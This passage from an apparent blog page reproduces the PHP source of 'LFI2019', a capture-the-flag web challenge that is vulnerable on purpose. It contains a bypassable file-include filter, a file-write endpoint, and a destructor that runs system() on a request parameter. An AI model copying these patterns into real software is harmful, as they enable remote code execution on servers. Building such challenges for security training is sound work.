class="hljs-keyword">me</span>-the-hint</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">        Developed by stypr.</span></span><br><span class="line"><span class="hljs-comment">        Made in 2018, Releasing in 2019!</span></span><br><span class="line"><span class="hljs-comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Baka flag-sama and seed-chan! //</span></span><br><span class="line">    error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line">    ini_set(<span class="hljs-string">"display_errors"</span>,<span class="hljs-string">"off"</span>);</span><br><span class="line">    @<span class="hljs-keyword">require</span>(<span class="hljs-string">'flag.php'</span>);</span><br><span class="line">    $seed = md5(rand(PHP_INT_MIN,PHP_INT_MAX));</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span>($flag === $_GET[<span class="hljs-string">'trigger'</span>]){</span><br><span class="line">        <span class="hljs-keyword">die</span>(hash(<span class="hljs-string">"sha256"</span>, $seed . $flag));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Sessions are never used but we add that //</span></span><br><span class="line">    ini_set(<span class="hljs-string">'session.cookie_httponly'</span>, <span class="hljs-number">1</span>); @phpinfo();</span><br><span class="line">    ini_set(<span class="hljs-string">'session.cookie_secure'</span>, <span class="hljs-number">1</span>); @phpinfo();</span><br><span class="line">    ini_set(<span class="hljs-string">'session.use_only_cookies'</span>,<span class="hljs-number">1</span>); @phpinfo();</span><br><span class="line">    ini_set(<span class="hljs-string">'session.gc_probability'</span>, <span class="hljs-number">1</span>); @phpinfo();</span><br><span class="line">    <span class="hljs-comment">// but really, you can't really do something with sessions. //</span></span><br><span class="line">    session_save_path(<span class="hljs-string">'./sess/'</span>);</span><br><span class="line">    session_name(<span class="hljs-string">"lfi2019"</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    session_destroy();</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Flush directory for security purposes //</span></span><br><span class="line">    <span class="hljs-comment">// Referenced it from StackOverflow: https://bit.ly/2MxvxXE //</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rrmdir</span><span class="hljs-params">($dir, $depth=<span class="hljs-number">0</span>)</span></span>{ </span><br><span class="line">        <span class="hljs-keyword">if</span> (is_dir($dir)){</span><br><span class="line">            $objects = scandir($dir); </span><br><span class="line">            <span class="hljs-keyword">foreach</span> ($objects <span class="hljs-keyword">as</span> $object){ </span><br><span class="line">                <span class="hljs-keyword">if</span> ($object != <span class="hljs-string">"."</span> &amp;&amp; $object != <span class="hljs-string">".."</span>){ </span><br><span class="line">                    <span class="hljs-keyword">if</span>(is_dir($dir.<span class="hljs-string">"/"</span>.$object))</span><br><span class="line">                        rrmdir($dir.<span class="hljs-string">"/"</span>.$object, $depth + <span class="hljs-number">1</span>);</span><br><span class="line">                    <span class="hljs-keyword">else</span></span><br><span class="line">                        unlink($dir.<span class="hljs-string">"/"</span>.$object); </span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span>($depth != <span class="hljs-number">0</span>) rmdir($dir); </span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">countdir</span><span class="hljs-params">($dir)</span></span>{</span><br><span class="line">        <span class="hljs-keyword">if</span> (is_dir($dir)){</span><br><span class="line">            $objects = scandir($dir);</span><br><span class="line">            <span class="hljs-keyword">foreach</span> ($objects <span class="hljs-keyword">as</span> $object){ </span><br><span class="line">                <span class="hljs-keyword">if</span> ($object != <span class="hljs-string">"."</span> &amp;&amp; $object != <span class="hljs-string">".."</span>){ </span><br><span class="line">                    $count += <span class="hljs-number">1</span>;</span><br><span class="line">                    <span class="hljs-keyword">if</span>(is_dir($dir.<span class="hljs-string">"/"</span>.$object))</span><br><span class="line">                        $count += countdir($dir.<span class="hljs-string">"/"</span>.$object);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> $count;</span><br><span class="line">    }</span><br><span class="line">    var_dump(countdir(<span class="hljs-string">"./files"</span>));</span><br><span class="line">    <span class="hljs-keyword">if</span>(countdir(<span class="hljs-string">"./files/"</span>) &gt;= <span class="hljs-number">100</span>) @rrmdir(<span class="hljs-string">"./files/"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Here, kawaii path-san for you! //</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">path_sanitizer</span><span class="hljs-params">($dir, $harden=false)</span></span>{</span><br><span class="line">        $dir = (string)$dir;</span><br><span class="line">        $dir_len = strlen($dir);</span><br><span class="line">        <span class="hljs-comment">// Deny LFI/RFI/XSS //</span></span><br><span class="line">        $filter = [<span class="hljs-string">'.'</span>, <span class="hljs-string">'./'</span>, <span class="hljs-string">'~'</span>, <span class="hljs-string">'.\\'</span>, <span class="hljs-string">'#'</span>, <span class="hljs-string">'&lt;'</span>, <span class="hljs-string">'&gt;'</span>];</span><br><span class="line">        <span class="hljs-keyword">foreach</span>($filter <span class="hljs-keyword">as</span> $f){</span><br><span class="line">            <span class="hljs-keyword">if</span>(stripos($dir, $f) !== <span class="hljs-keyword">false</span>){</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-comment">// Deny SSRF and all possible weird bypasses //</span></span><br><span class="line">        $stream = stream_get_wrappers();</span><br><span class="line">        $stream = array_merge($stream, stream_get_transports());</span><br><span class="line">        $stream = array_merge($stream, stream_get_filters());</span><br><span class="line">        <span class="hljs-keyword">foreach</span>($stream <span class="hljs-keyword">as</span> $f){</span><br><span class="line">            $f_len = strlen($f);</span><br><span class="line">            <span class="hljs-keyword">if</span>(substr($dir, <span class="hljs-number">0</span>, $f_len) === $f){</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-comment">// Deny length //</span></span><br><span class="line">        <span class="hljs-keyword">if</span>($dir_len &gt;= <span class="hljs-number">128</span>){</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">        }</span><br><span class="line">truetrue<span class="hljs-comment">// Easy level hardening //</span></span><br><span class="line">truetrue<span class="hljs-keyword">if</span>($harden){</span><br><span class="line">truetruetrue$harden_filter = [<span class="hljs-string">"/"</span>, <span class="hljs-string">"\\"</span>];</span><br><span class="line">truetruetrue<span class="hljs-keyword">foreach</span>($harden_filter <span class="hljs-keyword">as</span> $f){</span><br><span class="line">truetruetruetrue$dir = str_replace($f, <span class="hljs-string">""</span>, $dir);</span><br><span class="line">truetruetrue}</span><br><span class="line">truetrue}</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// Sanitize feature is available starting from the medium level //</span></span><br><span class="line">        <span class="hljs-keyword">return</span> $dir;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// The new kakkoii code-san is re-implemented. //</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">code_sanitizer</span><span class="hljs-params">($code)</span></span>{</span><br><span class="line">        <span class="hljs-comment">// Computer-chan, please don't speak english. Speak something else! //</span></span><br><span class="line">        $code = preg_replace(<span class="hljs-string">"/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-\\\'\"\=\(\)\[\]\;]/u"</span>, <span class="hljs-string">"*Nope*"</span>, (string)$code);</span><br><span class="line">        <span class="hljs-keyword">return</span> $code;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Errors are intended and straightforward. Please do not ask questions. //</span></span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Get</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">nanahira</span><span class="hljs-params">()</span></span>{</span><br><span class="line">            <span class="hljs-comment">// senpai notice me //</span></span><br><span class="line">            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exploit</span><span class="hljs-params">($data)</span></span>{</span><br><span class="line">                $exploit = <span class="hljs-keyword">new</span> System();</span><br><span class="line">            }</span><br><span class="line">            $_GET[<span class="hljs-string">'trigger'</span>] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[<span class="hljs-string">'leak'</span>][<span class="hljs-string">'leak'</span>]);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">private</span> $filename;</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename)</span></span>{</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;filename = path_sanitizer($filename);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">()</span></span>{</span><br><span class="line">            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;filename === <span class="hljs-keyword">false</span>){</span><br><span class="line">                <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"blocked by path sanitizer"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-comment">// wtf???? //</span></span><br><span class="line">            <span class="hljs-keyword">if</span>(!@file_exists(<span class="hljs-keyword">$this</span>-&gt;filename)){</span><br><span class="line">                <span class="hljs-comment">// index files are *completely* disabled. //</span></span><br><span class="line">                <span class="hljs-keyword">if</span>(stripos(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-string">"index"</span>) !== <span class="hljs-keyword">false</span>){</span><br><span class="line">                    <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"you cannot include index files!"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                <span class="hljs-comment">// hardened sanitizer spawned. thus we sense ambiguity //</span></span><br><span class="line">                $read_file = <span class="hljs-string">"./files/"</span> . <span class="hljs-keyword">$this</span>-&gt;filename;</span><br><span class="line">                $read_file_with_hardened_filter = <span class="hljs-string">"./files/"</span> . path_sanitizer(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="hljs-keyword">if</span>($read_file === $read_file_with_hardened_filter ||</span><br><span class="line">                    @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){</span><br><span class="line">                    <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"request blocked"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">                }</span><br><span class="line">                <span class="hljs-comment">// .. and finally, include *un*exploitable file is included. //</span></span><br><span class="line">                @<span class="hljs-keyword">include</span>(<span class="hljs-string">"./files/"</span> . <span class="hljs-keyword">$this</span>-&gt;filename);</span><br><span class="line">                <span class="hljs-keyword">return</span> [<span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"success"</span>];</span><br><span class="line">            }<span class="hljs-keyword">else</span>{</span><br><span class="line">                <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"invalid filename (wtf)"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Put</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">nanahira</span><span class="hljs-params">()</span></span>{</span><br><span class="line">            <span class="hljs-comment">// senpai notice me //</span></span><br><span class="line">            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exploit</span><span class="hljs-params">($data)</span></span>{</span><br><span class="line">                $exploit = <span class="hljs-keyword">new</span> System();</span><br><span class="line">            }</span><br><span class="line">            $_GET[<span class="hljs-string">'trigger'</span>] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[<span class="hljs-string">'leak'</span>][<span class="hljs-string">'leak'</span>]);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">private</span> $filename;</span><br><span class="line">        <span class="hljs-keyword">private</span> $content;</span><br><span class="line">        <span class="hljs-keyword">private</span> $dir = <span class="hljs-string">"./files/"</span>;</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename, $data)</span></span>{</span><br><span class="line">            <span class="hljs-keyword">global</span> $seed;</span><br><span class="line">            <span class="hljs-keyword">if</span>((string)$filename === (string)@path_sanitizer($data[<span class="hljs-string">'filename'</span>])){</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;filename = (string)$filename;</span><br><span class="line">            }<span class="hljs-keyword">else</span>{</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;filename = <span class="hljs-keyword">false</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;content = (string)@code_sanitizer($data[<span class="hljs-string">'content'</span>]);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">put</span><span class="hljs-params">()</span></span>{</span><br><span class="line">            <span class="hljs-comment">// just another typical file insertion //</span></span><br><span class="line">            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;filename === <span class="hljs-keyword">false</span>){</span><br><span class="line">                <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"blocked by path sanitizer"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-comment">// check if file exists //</span></span><br><span class="line">            <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-keyword">$this</span>-&gt;dir . <span class="hljs-keyword">$this</span>-&gt;filename)){</span><br><span class="line">                <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"file exists"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">            }</span><br><span class="line">            file_put_contents(<span class="hljs-keyword">$this</span>-&gt;dir . <span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="hljs-comment">// just check if file is written. hopefully. //</span></span><br><span class="line">            <span class="hljs-keyword">if</span>(@file_get_contents(<span class="hljs-keyword">$this</span>-&gt;dir . <span class="hljs-keyword">$this</span>-&gt;filename) == <span class="hljs-string">""</span>){</span><br><span class="line">                <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"file not written."</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">return</span> [<span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"success"</span>];</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Triggering this is nearly impossible //</span></span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">System</span> </span>{</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>{</span><br><span class="line">            <span class="hljs-keyword">global</span> $seed;</span><br><span class="line">            <span class="hljs-comment">// ain't Argon2, ain't pbkdf2. what could go wrong?</span></span><br><span class="line">            $flag = hash(<span class="hljs-string">'sha256'</span>, $seed);</span><br><span class="line">            <span class="hljs-keyword">if</span>($_GET[$flag]){</span><br><span class="line">                @system($_GET[$flag]);</span><br><span class="line">            }<span class="hljs-keyword">else</span>{</span><br><span class="line">                @unserialize($_SESSION[$flag]);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Don't call me a savage... I gave everything you need //</span></span><br><span class="line">    <span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">'QUERY_STRING'</span>] === <span class="hljs-string">"show-me-the-hint"</span>){</span><br><span class="line">        show_source(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// XSS protection and hints ^-^ //</span></span><br><span class="line">    header(<span class="hljs-string">'X-Hint: /index.php?show-me-the-hint'</span>);</span><br><span class="line">    header(<span class="hljs-string">'X-Frame-Options: DENY'</span>);</span><br><span class="line">    header(<span class="hljs-string">'X-XSS-Protection: 1; mode=block;'</span>);</span><br><span class="line">    header(<span class="hljs-string">'X-Content-Type-Options: nosniff'</span>);</span><br><span class="line">    header(<span class="hljs-string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line">    header(<span class="hljs-string">'Cache-Control: no-store, no-cache, must-revalidate, max-age=0'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">//header("Content-Security-Policy: default-src 'self'; script-src 'nonce-${seed}' 'unsafe-eval';" .</span></span><br><span class="line">    <span class="hljs-comment">//"font-src 'nonce-${seed}' fonts.gstatic.com; style-src 'nonce-${seed}' fonts.googleapis.com;");</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Hello, JSON! //</span></span><br><span class="line">    $parsed_url = explode(<span class="hljs-string">"&amp;"</span>, $_SERVER[<span class="hljs-string">'QUERY_STRING'</span>]);</span><br><span class="line">    <span class="hljs-keyword">if</span>(count($parsed_url) &gt;= <span class="hljs-number">2</span>){</span><br><span class="line">        header(<span class="hljs-string">"Content-Type:text/json"</span>);</span><br><span class="line">        <span class="hljs-keyword">switch</span>($parsed_url[<span class="hljs-number">0</span>]){</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-string">"get"</span>:</span><br><span class="line">                $get = <span class="hljs-keyword">new</span> Get($parsed_url[<span class="hljs-number">1</span>]);</span><br><span class="line">                $data = $get-&gt;get();</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-string">"put"</span>:</span><br><span class="line">                $put = <span class="hljs-keyword">new</span> Put($parsed_url[<span class="hljs-number">1</span>], $_POST);</span><br><span class="line">                $data = $put-&gt;put();</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">default</span>:</span><br><span class="line">                $data = [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"Invalid data."</span>];</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">die</span>(json_encode($data));</span><br><span class="line">    }</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=utf<span class="hljs-number">-8</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="hljs-string">"stylesheet"</span> href=<span class="hljs-string">"//stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css"</span> nonce=<span class="hljs-string">"&lt;?php echo $seed; ?&gt;"</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="hljs-string">"styleshhet"</span> href=<span class="hljs-string">"//fonts.googleapis.com/css?family=Muli:300,400,700"</span> nonce=<span class="hljs-string">"&lt;?php echo $seed; ?&gt;"</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="hljs-string">"stylesheet"</span> href=<span class="hljs-string">"./static/legit.css"</span> nonce=<span class="hljs-string">"&lt;?php echo $seed; ?&gt;"</span>&gt;</span><br><span class="line">    &lt;title&gt;LFI2019&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class="modal fade" id="put-modal"&gt;</span><br><span class="line">        &lt;div class="modal-dialog modal-lg"&gt;</span><br><span class="line">            &lt;div class="modal-content"&gt;</span><br><span class="line">                &lt;div class="modal-header"&gt;</span><br><span class="line">                    &lt;h5 class="modal-title"&gt;put2019&lt;/h5&gt;</span><br><span class="line">                    &lt;button type="button" class="close" data-dismiss="modal" aria-label="Close"&gt;</span><br><span class="line">                        &lt;span aria-hidden=<span class="hljs-string">"true"</span>&gt;&amp;times;&lt;/span&gt;</span><br><span class="line">                    &lt;/button&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="modal-body"&gt;</span><br><span class="line">                    &lt;div class="form-group"&gt;</span><br><span class="line">                        &lt;label for="upload-filename" class="col-form-label"&gt;Filename:&lt;/label&gt;</span><br><span class="line">                        &lt;input type="text" class="form-control" id="upload-filename"&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div class="form-group"&gt;</span><br><span class="line">                        &lt;label for="upload-content" class="col-form-label"&gt;Content:&lt;/label&gt;</span><br><span class="line">                        &lt;textarea class="form-control disabled" id="upload-content" rows=10&gt;&lt;/textarea&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div 